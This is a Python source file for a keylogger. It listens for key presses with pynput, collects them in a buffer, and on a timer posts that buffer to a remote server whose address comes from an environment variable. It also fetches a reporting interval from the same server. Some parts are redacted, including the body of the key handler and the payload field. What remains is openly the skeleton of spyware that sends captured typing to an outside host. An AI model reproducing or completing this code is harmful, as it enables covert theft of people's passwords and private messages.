
from pynput import keyboard
import requests
import threading
import datetime
import os
from dotenv import load_dotenv

load_dotenv()

SERVER_URL = os.getenv("-----redactedddd----------" ) 
SEND_INTERVAL = 30

     
LOCK = threading.Lock()
LOG_BUFFER=[]


def send_buffer():
    global status
    global SEND_INTERVAL
    global LOG_BUFFER
    with LOCK:
        if LOG_BUFFER:
            try:
                pass
                res=requests.get(SERVER_URL+"----------redactedddd------------")
                # if res:
                #     status=res.json()['status']
                    # print(type(status),status)
                    # ttend(status)
                    # if status!="":
                    #     ttend(status)
                SEND_INTERVAL=int(res.json()["interval"])
            except:
                pass
            payload = {
                "timestamp": datetime.datetime.now().strftime("%D:%H:%M:%S"),
                "data": "------redacteddd-----------"
            }
            try:
                res=requests.post(SERVER_URL, json=payload)
                
                if res:
                    LOG_BUFFER.clear()
            except:
              pass
                
    threading.Timer(SEND_INTERVAL, send_buffer).start()


def on_press(key):
  '''
  -------------redactedddd--------------
  '''

send_buffer()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



